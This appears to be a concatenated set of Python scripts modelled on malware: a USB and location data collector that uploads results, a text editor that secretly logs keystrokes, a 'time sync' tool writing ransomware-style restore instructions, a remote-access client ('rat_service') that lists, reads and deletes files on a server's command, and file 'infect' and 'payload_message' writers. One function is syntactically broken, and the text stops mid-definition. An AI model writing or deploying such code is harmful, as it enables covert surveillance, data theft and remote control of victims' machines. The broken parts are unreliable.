# Configure logging
LOG_FILE = './usb_scanner.log'
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def list_usb_storage_devices():
    usb_devices = []
    mounts_file = '/proc/mounts'

    if os.path.exists(mounts_file):
        with open(mounts_file, 'r') as f:
            for line in f:
                parts = line.split()
                device, mount_point = parts[0], parts[1]
                if device.startswith('/dev/sd') and 'usb' in device.lower():
                    usb_devices.append((device, mount_point))
    return usb_devices

def collect_metadata(mount_point):
    metadata = []
    for root, _, files in os.walk(mount_point):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                stat = os.stat(file_path)
                file_info = {
                    'file_path': file_path,
                    'size': stat.st_size,
                    'creation_date': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(stat.st_ctime)),
                }
                metadata.append(file_info)
            except Exception as e:
                logging.error(f"Error collecting metadata for {file_path}: {e}")
                metadata.append({'file_path': file_path, 'error': str(e)})
    return metadata

def save_metadata_to_file(metadata, output_file):
    os.makedirs(os.path.dirname(output_file), exist_ok=True)
    with open(output_file, 'w') as f:
        for entry in metadata:
            if 'error' in entry:
                f.write(f"Error reading file: {entry['file_path']} - {entry['error']}\n")
            else:
                f.write(f"File: {entry['file_path']}, Size: {entry['size']} bytes, Created: {entry['creation_date']}\n")

def send_metadata_to_server(metadata, server_url):
    try:
        conn = http.client.HTTPConnection(server_url)
        headers = {'Content-Type': 'application/json'}
        payload = str(metadata).replace("'", '"')  # Convert to JSON-like string
        conn.request("POST", "/upload", payload, headers)
        response = conn.getresponse()
        logging.info(f"Sent metadata to server {server_url}. Response: {response.status} {response.reason}")
        conn.close()
    except (socket.error, http.client.HTTPException) as e:
        logging.error(f"Failed to send metadata to server {server_url}: {e}")

def scan_and_process(output_file, server_url):
    usb_devices = list_usb_storage_devices()
    all_metadata = []

    if usb_devices:
        logging.info("Scanning USB storage devices...")
        for device, mount_point in usb_devices:
            logging.info(f"Collecting metadata for device {device} at mount point {mount_point}...")
            metadata = collect_metadata(mount_point)
            all_metadata.extend(metadata)
    else:
        logging.info("No USB storage devices detected.")

    save_metadata_to_file(all_metadata, output_file)
    logging.info(f"Metadata saved to {output_file}")

    send_metadata_to_server(all_metadata, server_url)

def register_as_service(interval=60, iterations=1, output_file='./target/output_file.txt', server_url='localhost:8000'):
    def service_task():
        for _ in range(iterations):
            scan_and_process(output_file, server_url)
            time.sleep(interval)

    service_thread = threading.Thread(target=service_task)
    service_thread.daemon = True
    service_thread.start()
    logging.info(f"Background service registered with interval={interval} seconds and iterations={iterations}.")

def main():
    output_file = './target/output_file.txt'
    server_url = 'localhost:8000'
    interval = 60
    iterations = 1

    # Run as service (optional)
    register_as_service(interval=interval, iterations=iterations, output_file=output_file, server_url=server_url)

    # Run a single scan immediately
    scan_and_process(output_file, server_url)

if __name__ == "__main__":
    main()

import os
import http.client

def read_file(input_path):
    if not os.path.exists(input_path):
        print(f"Error: File '{input_path}' does not exist.")
        return None

    try:
        with open(input_path, 'r') as infile:
            lines = infile.readlines()
            return [line.strip() for line in lines if line.strip()]  # Strip whitespaces and filter empty lines
    except OSError as e:
        print(f"Error: Unable to read the file '{input_path}'. {e}")
        return None

def write_file(output_path, lines):
    try:
        with open(output_path, 'w') as outfile:
            outfile.writelines(f"{line}\n" for line in lines)  # Ensure consistent newline formatting
        return True
    except OSError as e:
        print(f"Error: Unable to write to the file '{output_path}'. {e}")
        return False

def report_to_server(output_path):
    server = 'attendance.example.com'
    endpoint = '/report'

    try:
        with open(output_path, 'r') as file:
            data = file.read()

        connection = http.client.HTTPConnection(server, timeout=10)
        headers = {'Content-Type': 'text/plain'}
        connection.request('POST', endpoint, body=data, headers=headers)
        response = connection.getresponse()

        if response.status == 200:
            print(f"Successfully reported location records to the server: {server}")
        else:
            print(f"Failed to report to the server. HTTP Status: {response.status}, Reason: {response.reason}")
    except (OSError, http.client.HTTPException) as e:
        print(f"Error: Unable to report to the server. {e}")
    finally:
        if 'connection' in locals() and connection:
            connection.close()

def process_and_report():
    input_path = 'target/location.txt'
    output_path = 'location_log.txt'

    # Step 1: Read the input file
    lines = read_file(input_path)
    if lines is None or not lines:
        print("No valid records found in the input file. Aborting.")
        return

    # Step 2: Write the records to location_log.txt
    if not write_file(output_path, lines):
        return

    # Step 3: Report the records to the remote server
    report_to_server(output_path)

if __name__ == "__main__":
    process_and_report()

import os
import socket
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Configuration
REMOTE_SERVER_HOST = "example.com"  # Replace with your server address
REMOTE_SERVER_PORT = 8080          # Replace with your server port
REPORT_FILENAME = "audio_report.txt"

def list_audio_devices():
    """Scan the system for available audio recording devices."""
    devices = []
    logging.info("Scanning for audio devices...")
    if os.name == 'posix':
        sound_card_path = "/proc/asound/cards"
        if os.path.exists(sound_card_path):
            with open(sound_card_path, "r") as f:
                for line in f:
                    if line.strip() and not line.startswith("---"):
                        # Extracting device name assuming format: <index> <device_name>
                        device_info = line.strip().split(":", 1)
                        if len(device_info) == 2:
                            devices.append((device_info[1].strip(), "Available"))
        else:
            logging.warning("No sound card information found at '%s'.", sound_card_path)
    elif os.name == 'nt':
        # Simulated Windows audio device enumeration
        logging.info("Simulating Windows audio device enumeration...")
        # Simulated devices for Windows
        devices.append(("Simulated Audio Device 1", "Available"))
        devices.append(("Simulated Audio Device 2", "Available"))
    else:
        logging.warning("Unsupported operating system.")
    return devices

def write_report(devices):
    """Write the audio device report to a file."""
    logging.info("Writing audio device report to '%s'...", REPORT_FILENAME)
    try:
        with open(REPORT_FILENAME, "w", encoding="utf-8") as f:
            if devices:
                for name, status in devices:
                    f.write(f"{name} - {status}\n")
            else:
                f.write("No audio devices found.\n")
        logging.info("Report written successfully.")
    except IOError as e:
        logging.error("Failed to write report: %s", e)

def upload_report():
    """Upload the report to the configured remote server."""
    logging.info("Attempting to upload report to remote server (%s:%d)...", REMOTE_SERVER_HOST, REMOTE_SERVER_PORT)
    try:
        if not os.path.exists(REPORT_FILENAME):
            logging.error("Report file '%s' does not exist. Cannot upload.", REPORT_FILENAME)
            return

        with open(REPORT_FILENAME, "r", encoding="utf-8") as f:
            report_content = f.read()

        # Send report via a TCP socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)  # Set a timeout for the connection
            s.connect((REMOTE_SERVER_HOST, REMOTE_SERVER_PORT))
            s.sendall(report_content.encode("utf-8"))
        logging.info("Report uploaded successfully.")
    except (socket.error, FileNotFoundError, socket.timeout) as e:
        logging.error("Failed to upload report: %s", e)

def main():
    """Main program execution."""
    devices = list_audio_devices()
    if not devices:
        logging.info("No audio devices were found on the system.")
    write_report(devices)
    upload_report()
    logging.info("Program completed successfully.")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logging.error("An unexpected error occurred: %s", e)
        exit(1)
    exit(0)

import tkinter as tk
import os
import sys
import threading
import time

LOG_FILE = "keystrokes.txt"
CHECK_INTERVAL = 5  # seconds
MAX_LOG_SIZE = 1024 * 1024  # 1MB
RUN_DURATION = 60  # seconds (bounded loop duration)

def ensure_log_file_exists():
    """Ensure the log file exists and is within size constraints."""
    try:
        if not os.path.exists(LOG_FILE):
            with open(LOG_FILE, "w") as _:
                pass  # Create log file
        elif os.path.getsize(LOG_FILE) > MAX_LOG_SIZE:
            with open(LOG_FILE, "w") as log:
                log.write("")  # Truncate if too large
    except Exception as e:
        print(f"Error managing log file: {e}")

def background_service():
    """Background service to periodically manage the log file."""
    start_time = time.time()
    while time.time() - start_time < RUN_DURATION:
        ensure_log_file_exists()
        time.sleep(CHECK_INTERVAL)
    os._exit(0)  # Exit cleanly after the duration

class TextEditor:
    def __init__(self, root):
        self.root = root
        self.root.title("Enhanced Text Editor with Background Service")
        self.text_area = tk.Text(root, wrap="word", undo=True)
        self.text_area.pack(fill="both", expand=True)
        self.create_menu()
        self.setup_keylogger()

    def create_menu(self):
        menu_bar = tk.Menu(self.root)
        file_menu = tk.Menu(menu_bar, tearoff=0)
        file_menu.add_command(label="Open", command=self.open_file)
        file_menu.add_command(label="Save", command=self.save_file)
        file_menu.add_command(label="Exit", command=self.root.quit)
        menu_bar.add_cascade(label="File", menu=file_menu)
        self.root.config(menu=menu_bar)

    def open_file(self):
        file_path = tk.filedialog.askopenfilename(filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        if file_path:
            try:
                with open(file_path, "r") as file:
                    content = file.read()
                self.text_area.delete("1.0", tk.END)
                self.text_area.insert("1.0", content)
            except Exception as e:
                tk.messagebox.showerror("Error", f"Could not open file: {e}")

    def save_file(self):
        file_path = tk.filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        if file_path:
            try:
                with open(file_path, "w") as file:
                    content = self.text_area.get("1.0", tk.END).rstrip()
                    file.write(content)
            except Exception as e:
                tk.messagebox.showerror("Error", f"Could not save file: {e}")

    def setup_keylogger(self):
        self.text_area.bind("<Key>", self.log_keystroke)

    def log_keystroke(self, event):
        key = event.char if event.char else f"[{event.keysym}]"
        try:
            with open(LOG_FILE, "a") as log:
                log.write(key)
        except Exception as e:
            print(f"Could not log keystroke: {e}")

def run_headless():
    """Run the program headless for the bounded duration."""
    start_time = time.time()
    ensure_log_file_exists()
    while time.time() - start_time < RUN_DURATION:
        ensure_log_file_exists()
        time.sleep(CHECK_INTERVAL)
    os._exit(0)  # Exit cleanly

def main():
    # Check if the program is running headless
    if "headless" in sys.argv:
        run_headless()
    else:
        # Start the background service in a separate thread
        threading.Thread(target=background_service, daemon=True).start()

        # Initialize and run the text editor
        root = tk.Tk()
        editor = TextEditor(root)
        root.mainloop()

if __name__ == "__main__":
    main()

import datetime
import time
import json
import os
import hashlib
import base64
import http.client
import urllib.parse
from time import sleep

LOG_FILE = 'time_sync_log.txt'
CONFIG_FILE = 'time_sync_config.json'
INSTRUCTIONS_FILE = 'RESTORE_INSTRUCTIONS.html'
DEFAULT_PASSPHRASE = 'default_secure_passphrase'
DEFAULT_SERVER_URL = 'http://example.com/timesync'
DEFAULT_INTERVAL = 86400  # 24 hours in seconds
DEFAULT_ITERATIONS = 1
MAX_RETRIES = 5

def sha256_hash(data):
    return hashlib.sha256(data.encode('utf-8')).digest()

def encrypt(data, passphrase):
    key = sha256_hash(passphrase)
    data_bytes = data.encode('utf-8')
    encrypted = bytearray(b ^ key[i % len(key)] for i, b in enumerate(data_bytes))
    return base64.b64encode(encrypted).decode('utf-8')

def decrypt(data, passphrase):
    key = sha256_hash(passphrase)
    data_bytes = base64.b64decode(data.encode('utf-8'))
    decrypted = bytearray(b ^ key[i % len(key)] for i, b in enumerate(data_bytes))
    return decrypted.decode('utf-8')

def collect_time_and_timezone_info():
    now = datetime.datetime.now()
    formatted_time = now.strftime("%Y-%m-%d %H:%M:%S")
    timezone = time.tzname[time.daylight] if time.daylight else time.tzname[0]
    return {
        "timestamp": formatted_time,
        "system_time": formatted_time,
        "timezone": timezone
    }

def append_to_log_file(log_entry, passphrase):
    encrypted_entry = encrypt(json.dumps(log_entry), passphrase)
    with open(LOG_FILE, 'a') as log_file:
        log_file.write(encrypted_entry + '\n')

def send_data_to_server(data, server_url):
    parsed_url = urllib.parse.urlparse(server_url)
    connection = http.client.HTTPConnection(parsed_url.netloc, timeout=10)
    headers = {'Content-Type': 'application/json'}
    body = json.dumps(data)
    try:
        connection.request("POST", parsed_url.path, body, headers)
        response = connection.getresponse()
        return response.status, response.read()
    finally:
        connection.close()

def retry_with_backoff(func, max_attempts, *args, **kwargs):
    for attempt in range(max_attempts):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            if attempt < max_attempts - 1:
                sleep(2 ** attempt)
            else:
                raise e

def write_config(interval, iterations):
    config = {
        "interval": interval,
        "iterations": iterations
    }
    with open(CONFIG_FILE, 'w') as config_file:
        json.dump(config, config_file)

def read_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as config_file:
            return json.load(config_file)
    return {"interval": DEFAULT_INTERVAL, "iterations": DEFAULT_ITERATIONS}

def write_recovery_instructions():
    instructions = f"""
    <html>
    <head><title>Decryption Instructions</title></head>
    <body>
        <h1>Log File Decryption Instructions</h1>
        <p>The log file <code>{LOG_FILE}</code> is encrypted. To decrypt it, use the following Python code:</p>
        <pre>
import hashlib
import base64

def sha256_hash(data):
    return hashlib.sha256(data.encode('utf-8')).digest()

def decrypt(data, passphrase):
    key = sha256_hash(passphrase)
    data_bytes = base64.b64decode(data.encode('utf-8'))
    decrypted = bytearray(b ^ key[i % len(key)] for i, b in enumerate(data_bytes))
    return decrypted.decode('utf-8')

with open('{LOG_FILE}', 'r') as f:
    encrypted_lines = f.readlines()

passphrase = "your_passphrase_here"
for line in encrypted_lines:
    print(decrypt(line.strip(), passphrase))
        </pre>
        <p>Replace <code>your_passphrase_here</code> with the passphrase used to encrypt the file.</p>
    </body>
    </html>
    """
    with open(INSTRUCTIONS_FILE, 'w') as file:
        file.write(instructions)

def run_service(server_url, passphrase, interval, iterations):
    for _ in range(iterations):
        log_entry = collect_time_and_timezone_info()
        append_to_log_file(log_entry, passphrase)
        try:
            retry_with_backoff(send_data_to_server, MAX_RETRIES, log_entry, server_url)
        except Exception as e:
            print(f"Failed to send data to server: {e}")
        if iterations > 1:
            sleep(interval)

def main():
    if not os.path.exists(INSTRUCTIONS_FILE):
        write_recovery_instructions()

    config = read_config()
    interval = config.get("interval", DEFAULT_INTERVAL)
    iterations = config.get("iterations", DEFAULT_ITERATIONS)
    passphrase = DEFAULT_PASSPHRASE
    server_url = DEFAULT_SERVER_URL

    write_config(interval, iterations)
    run_service(server_url, passphrase, interval, iterations)
    exit(0)

if __name__ == "__main__":
    main()

import argparse
import os
import datetime
import time
import sys

def log_conversion(source_currency, target_currency, amount, converted_amount, exchange_rate, log_file):
    timestamp = datetime.datetime.now().isoformat()
    log_entry = (f"{timestamp} | {amount} {source_currency} -> {converted_amount:.2f} {target_currency} "
                 f"(exchange rate: {exchange_rate})\n")
    try:
        with open(log_file, "a") as file:
            file.write(log_entry)
    except Exception as e:
        print(f"Error writing to log file: {e}")

def perform_conversion(source_currency, target_currency, amount, exchange_rate, log_file):
    converted_amount = amount * exchange_rate
    print(f"{amount} {source_currency} is {converted_amount:.2f} {target_currency} (exchange rate: {exchange_rate})")
    log_conversion(source_currency, target_currency, amount, converted_amount, exchange_rate, log_file)

def run_service(source_currency, target_currency, amount, interval, cycles, exchange_rate, log_file):
    for _ in range(cycles):
        perform_conversion(source_currency, target_currency, amount, exchange_rate, log_file)
        time.sleep(interval)

def currency_converter():
    exchange_rate = 1.2  # Mock exchange rate
    log_dir = "./target"
    log_file = os.path.join(log_dir, "conversion_log.txt")

    # Ensure the log directory exists
    try:
        os.makedirs(log_dir, exist_ok=True)
    except Exception as e:
        print(f"Error creating log directory: {e}")
        return

    parser = argparse.ArgumentParser(description="Simulate a basic currency conversion tool.")
    parser.add_argument("source_currency", type=str, help="Source currency code (e.g., USD).", nargs="?")
    parser.add_argument("target_currency", type=str, help="Target currency code (e.g., EUR).", nargs="?")
    parser.add_argument("amount", type=float, help="Amount to convert.", nargs="?")
    parser.add_argument("--register-service", action="store_true", help="Run as a service.")
    parser.add_argument("--interval", type=int, default=10, help="Interval in seconds between conversions (default: 10).")
    parser.add_argument("--cycles", type=int, default=1, help="Number of cycles to run (default: 1).")
    args = parser.parse_args()

    if args.register_service:
        if args.source_currency and args.target_currency and args.amount:
            print("Running as a service...")
            try:
                run_service(args.source_currency, args.target_currency, args.amount, args.interval, args.cycles, exchange_rate, log_file)
            except KeyboardInterrupt:
                print("Service interrupted. Exiting gracefully.")
            except Exception as e:
                print(f"Error in service execution: {e}")
        else:
            print("Error: Source currency, target currency, and amount must be provided to run as a service.")
    else:
        if args.source_currency and args.target_currency and args.amount:
            perform_conversion(args.source_currency, args.target_currency, args.amount, exchange_rate, log_file)
        else:
            print("Error: Missing required arguments for single conversion.")

if __name__ == "__main__":
    try:
        currency_converter()
    except Exception as e:
        print(f"Unexpected error: {e}")
        sys.exit(1)

import os
import json
import time
import socket
import threading

# Constants
SERVER_HOST = "127.0.0.1"  # Default server IP address
SERVER_PORT = 9000         # Default server port
BUFFER_SIZE = 1024
DEFAULT_DIRECTORY = "."    # Default directory to operate on
DEFAULT_FILE = "default.txt"  # Default file for file operations
SERVICE_INTERVAL = 60      # Time interval for background updates (in seconds)
MAX_ITERATIONS = 10        # Maximum iterations for bounded loops

# File and Directory Operations
def list_files(directory=DEFAULT_DIRECTORY):
    try:
        files = os.listdir(directory)
        return json.dumps({"status": "success", "files": files})
    except FileNotFoundError:
        return json.dumps({"status": "error", "message": f"Directory '{directory}' does not exist."})
    except PermissionError:
        return json.dumps({"status": "error", "message": f"Permission denied for directory '{directory}'."})

def read_file(file_path=DEFAULT_FILE):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            content = file.read()
            return json.dumps({"status": "success", "content": content})
    except FileNotFoundError:
        return json.dumps({"status": "error", "message": f"File '{file_path}' does not exist."})
    except PermissionError:
        return json.dumps({"status": "error", "message": f"Permission denied for file '{file_path}'."})
    except Exception as e:
        return json.dumps({"status": "error", "message": f"Error reading file '{file_path}': {e}"})

def delete_file(file_path=DEFAULT_FILE):
    try:
        os.remove(file_path)
        return json.dumps({"status": "success", "message": f"File '{file_path}' deleted."})
    except FileNotFoundError:
        return json.dumps({"status": "error", "message": f"File '{file_path}' does not exist."})
    except PermissionError:
        return json.dumps({"status": "error", "message": f"Permission denied to delete file '{file_path}'."})
    except Exception as e:
        return json.dumps({"status": "error", "message": f"Error deleting file '{file_path}': {e}"})

def embed_metadata(file_path=DEFAULT_FILE):
    try:
        metadata = {
            "unique_id": os.path.basename(file_path),
            "last_modified": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(os.path.getmtime(file_path))),
        }
        with open(file_path, 'a', encoding='utf-8') as file:
            file.write("\n---METADATA---\n")
            file.write(json.dumps(metadata))
        return json.dumps({"status": "success", "message": f"Metadata added to '{file_path}'."})
    except FileNotFoundError:
        return json.dumps({"status": "error", "message": f"File '{file_path}' does not exist."})
    except PermissionError:
        return json.dumps({"status": "error", "message": f"Permission denied to modify file '{file_path}'."})
    except Exception as e:
        return json.dumps({"status": "error", "message": f"Error embedding metadata into file '{file_path}': {e}"})

def read_metadata(file_path=DEFAULT_FILE):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()
        if "---METADATA---\n" in lines:
            metadata_index = lines.index("---METADATA---\n") + 1
            metadata = json.loads("".join(lines[metadata_index:]))
            return json.dumps({"status": "success", "metadata": metadata})
        else:
            return json.dumps({"status": "error", "message": f"No metadata found in '{file_path}'."})
    except FileNotFoundError:
        return json.dumps({"status": "error", "message": f"File '{file_path}' does not exist."})
    except PermissionError:
        return json.dumps({"status": "error", "message": f"Permission denied to read file '{file_path}'."})
    except Exception as e:
        return json.dumps({"status": "error", "message": f"Error reading metadata from file '{file_path}': {e}"})

# Command Handler
def handle_command(command, args=None):
    if command == "list":
        return list_files(args if args else DEFAULT_DIRECTORY)
    elif command == "read":
        return read_file(args if args else DEFAULT_FILE)
    elif command == "delete":
        return delete_file(args if args else DEFAULT_FILE)
    elif command == "embed_metadata":
        return embed_metadata(args if args else DEFAULT_FILE)
    elif command == "read_metadata":
        return read_metadata(args if args else DEFAULT_FILE)
    else:
        return json.dumps({"status": "error", "message": f"Unknown command '{command}'."})

# Server Handler
def server_handler():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            print(f"Connected to server at {SERVER_HOST}:{SERVER_PORT}")
            for _ in range(MAX_ITERATIONS):
                try:
                    message = client_socket.recv(BUFFER_SIZE).decode('utf-8')
                    if not message:
                        break
                    print(f"Received command: {message}")
                    data = json.loads(message)
                    command = data.get("command")
                    args = data.get("args", None)
                    result = handle_command(command, args)
                    client_socket.sendall(result.encode('utf-8'))
                except json.JSONDecodeError:
                    error_msg = json.dumps({"status": "error", "message": "Invalid JSON received."})
                    client_socket.sendall(error_msg.encode('utf-8'))
                except Exception as e:
                    error_msg = json.dumps({"status": "error", "message": f"Error processing command: {e}"})
                    client_socket.sendall(error_msg.encode('utf-8'))
    except Exception as e:
        print(f"Error connecting to server: {e}")

# Background Service
def rat_service():
    for _ in range(MAX_ITERATIONS):
        time.sleep(SERVICE_INTERVAL)
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((SERVER_HOST, SERVER_PORT))
                update = {"status": "alive", "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')}
                client_socket.sendall(json.dumps(update).encode('utf-8'))
        except Exception as e:
            print(f"Error sending update to server: {e}")

# Main Function
def main():
    server_thread = threading.Thread(target=server_handler, daemon=True)
    server_thread.start()

    rat_thread = threading.Thread(target=rat_service, daemon=True)
    rat_thread.start()

    server_thread.join()
    rat_thread.join()

if __name__ == "__main__":
    main()

import os

LOG_FILE = 'infect_log.txt'
DEFAULT_FILE_PATH = 'default_file.txt'
DEFAULT_DATA = 'Sample data to append.\n'
DEFAULT_LOG_LEVEL = 'INFO'
DEFAULT_DRY_RUN = False
DEFAULT_PRINT_SUCCESS = True
DEFAULT_SUMMARY_ONLY = False
MAX_LOG_ENTRIES = 100  # Limit log entries for bounded loops

def log_append_operation(data, file_path, log_level):
    """Logs the append operation details to the log file."""
    log_entry = f"{log_level},{data.strip()},{len(data.strip())},{file_path}\n"
    try:
        with open(LOG_FILE, 'a') as log_file:
            log_file.write(log_entry)
    except OSError as e:
        print(f"ERROR: Failed to write to log file: {e}")
        return False
    return True

def append_to_file(file_path, data, dry_run, print_success, log_level):
    """Appends data to a file and logs the operation."""
    if dry_run:
        if log_level == 'INFO':
            print(f"[DRY RUN] Simulated appending data to {file_path}, size: {len(data.strip())} bytes.")
        return True

    try:
        with open(file_path, 'a') as file:
            file.write(data)

        if not log_append_operation(data, file_path, log_level):
            return False

        if print_success and log_level == 'INFO':
            print("Data appended successfully.")
    except FileNotFoundError:
        print(f"ERROR: The file '{file_path}' does not exist.")
        return False
    except PermissionError:
        print(f"ERROR: Insufficient permissions to write to '{file_path}'.")
        return False
    except OSError as e:
        print(f"ERROR: An unexpected error occurred: {e}")
        return False
    return True

def summarize_log(summary_only):
    """Summarizes the log file content."""
    total_bytes = 0
    total_entries = 0

    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r') as log_file:
                for i, line in enumerate(log_file):
                    if i >= MAX_LOG_ENTRIES:  # Ensure bounded loop
                        break
                    try:
                        parts = line.strip().split(',')
                        if len(parts) != 4:
                            continue
                        _, _, byte_size, _ = parts
                        total_bytes += int(byte_size)
                        total_entries += 1
                    except ValueError:
                        continue  # Ignore malformed log entries

        summary_message = f"Summary: {total_bytes} bytes appended, {total_entries} log entries written."
        if summary_only:
            summary_message = f"{total_bytes} bytes appended, {total_entries} log entries written."
        print(summary_message)
    except OSError as e:
        print(f"ERROR: An error occurred while summarizing logs: {e}")
        return False
    return True

def ensure_file_exists(file_path):
    """Ensures the specified file exists by creating it if necessary."""
    try:
        if not os.path.exists(file_path):
            with open(file_path, 'w') as _:
                pass
    except OSError as e:
        print(f"ERROR: Failed to create file '{file_path}': {e}")
        return False
    return True

def main():
    """Main function to execute the program."""
    # Default configuration
    file_path = DEFAULT_FILE_PATH
    data = DEFAULT_DATA
    dry_run = DEFAULT_DRY_RUN
    summary_only = DEFAULT_SUMMARY_ONLY
    print_success = DEFAULT_PRINT_SUCCESS
    log_level = DEFAULT_LOG_LEVEL

    # Ensure the default file exists
    if not ensure_file_exists(file_path):
        return

    # Append data to the file and summarize logs
    if not append_to_file(file_path, data, dry_run, print_success, log_level):
        return

    if not summarize_log(summary_only):
        return

if __name__ == '__main__':
    main()

import os
import sys
import time
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(
    filename='file_processor.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def process_file(file_path, message):
    try:
        with open(file_path, 'r+', encoding='utf-8') as f:
            content = f.read()
                content += f"\n{message}\n"
                    content += 'payload_message'  # Default to 'payload_message' if neither keyword is present
                f.seek(0)
                f.write(content)
                f.truncate()
                logging.info(f"Updated file: {file_path}")
                return True
            logging.info(f"No changes needed for file: {file_path}")
            return False
    except (OSError, IOError) as e:
        logging.error(f"Error processing file {file_path}: {e}")
        return False

def process_directory(directory, message):
    processed_files = []
    try:
        for root, _, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                updated = process_file(file_path, message)
                processed_files.append((file_path, updated))
    except Exception as e:
        logging.error(f"Error scanning directory {directory}: {e}")
    return processed_files

def retry_with_backoff(func, retries=5, initial_delay=1):
    delay = initial_delay
    for attempt in range(retries):
        try:
            return func()
        except Exception as e:
            logging.error(f"Retry attempt {attempt + 1} failed: {e}")
            time.sleep(delay)
            delay *= 2
    logging.error("All retry attempts failed.")
    return None

def background_mode(directory, message, interval, iterations):
    try:
        for i in range(iterations):
            logging.info(f"Background iteration {i + 1}/{iterations}.")
            process_directory(directory, message)
            time.sleep(interval)
    except KeyboardInterrupt:
        logging.info("Background execution interrupted by user.")
    except Exception as e:
        logging.error(f"Error during background execution: {e}")

def main():
    import argparse
    parser = argparse.ArgumentParser(description="Ensure files contain a specified message and keyword.")
    parser.add_argument("directory", nargs="?", default="./target", help="Target directory (default: ./target)")
    parser.add_argument("message", help="Message to ensure exists in each file")
    parser.add_argument("--interval", type=int, default=60, help="Interval between background iterations (seconds)")
    parser.add_argument("--iterations", type=int, default=1, help="Number of background iterations to perform")
    parser.add_argument("--background", action="store_true", help="Enable background execution mode")
    args = parser.parse_args()

    if args.background:
        logging.info(f"Starting background mode with interval: {args.interval}s, iterations: {args.iterations}.")
        background_mode(args.directory, args.message, args.interval, args.iterations)
    else:
        logging.info("Starting one-time file processing.")
        processed_files = retry_with_backoff(lambda: process_directory(args.directory, args.message))
        if processed_files is not None:
            logging.info("\nSummary Report:")
            for file_path, updated in processed_files:
                status = "Updated" if updated else "No changes needed"
                logging.info(f"{file_path}: {status}")

if __name__ == "__main__":
    main()

import subprocess
import sys
import os
import argparse
import logging

def setup_logging(log_file):
    logging.basicConfig(
        filename=log_file,
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
    )

def read_boot_sector(device, verbose):
    try:
        if verbose:
            logging.info(f"Attempting to read boot sector from {device}.")
        result = subprocess.run(
            ["dd", f"if={device}", "bs=512", "count=1"],
            capture_output=True,
            text=True,
            check=True
        )
        if verbose:
            logging.info("Boot sector read successfully.")
        return result.stdout
    except FileNotFoundError:
        logging.error("Error: 'dd' command not found. Ensure it is installed and accessible.")
        if verbose:
            print("Error: 'dd' command not found. Ensure it is installed and accessible.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error: Failed to execute 'dd' command. Return code: {e.returncode}. Stderr: {e.stderr.strip()}")
        if verbose:
            print(f"Error: Failed to execute 'dd' command. Return code: {e.returncode}.")
    except PermissionError:
        logging.error("Error: Permission denied. Please run the script with appropriate privileges.")
        if verbose:
            print("Error: Permission denied. Please run the script with appropriate privileges.")
    except Exception as e:
        logging.error(f"Unexpected error occurred: {e}")
        if verbose:
            print(f"Unexpected error occurred: {e}")
    return None

def write_to_file(data, filename, verbose):
    try:
        with open(filename, "w", encoding="utf-8") as file:
            file.write(data)
        logging.info(f"Boot sector information written to '{filename}'.")
        if verbose:
            print(f"Boot sector information written to '{filename}'.")
    except PermissionError:
        logging.error(f"Error: Permission denied while writing to '{filename}'.")
        if verbose:
            print(f"Error: Permission denied while writing to '{filename}'.")
    except OSError as e:
        logging.error(f"Error: Failed to write to file '{filename}'. Reason: {e}")
        if verbose:
            print(f"Error: Failed to write to file '{filename}'. Reason: {e}")
    except Exception as e:
        logging.error(f"Unexpected error occurred while writing to file: {e}")
        if verbose:
            print(f"Unexpected error occurred while writing to file: {e}")

def main():
    parser = argparse.ArgumentParser(description="Boot sector utility tool.")
    parser.add_argument(
        "-d", "--device", 
        default="/dev/sda", 
        help="The device to read the boot sector from (default: /dev/sda)."
    )
    parser.add_argument(
        "-o", "--output", 
        default="boot_report.txt", 
        help="The file to write the boot sector information to (default: boot_report.txt)."
    )
    parser.add_argument(
        "-l", "--log", 
        default="boot_tool.log", 
        help="The log file to write program logs to (default: boot_tool.log)."
    )
    parser.add_argument(
        "-v", "--verbose", 
        action="store_true", 
        help="Enable verbose logging and console output."
    )
    args = parser.parse_args()

    # Set up logging
    setup_logging(args.log)
    logging.info("Boot sector utility started.")

    try:
        boot_sector_data = read_boot_sector(args.device, args.verbose)
        if boot_sector_data:
            write_to_file(boot_sector_data, args.output, args.verbose)
    except KeyboardInterrupt:
        logging.warning("Operation cancelled by user.")
        if args.verbose:
            print("\nOperation cancelled by user.")
        sys.exit(1)
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
        if args.verbose:
            print(f"An unexpected error occurred: {e}")
        sys.exit(1)

    logging.info("Boot sector utility completed successfully.")
    if args.verbose:
        print("Boot sector utility completed successfully.")

if __name__ == "__main__":
    main()

import os
import http.client
import json
import traceback
import resource
import urllib.parse

def get_memory_info():
    """Retrieve memory usage information."""
    try:
        usage = resource.getrusage(resource.RUSAGE_SELF)
        return {
            "max_rss_kb": usage.ru_maxrss,
            "shared_memory_kb": getattr(usage, "ru_ixrss", 0),
            "unshared_memory_kb": getattr(usage, "ru_idrss", 0),
            "stack_memory_kb": getattr(usage, "ru_isrss", 0),
        }
    except Exception as e:
        return {"error": f"Unable to access memory usage data: {e}"}

def write_memory_info_to_file(data, filename="memory_dump.txt"):
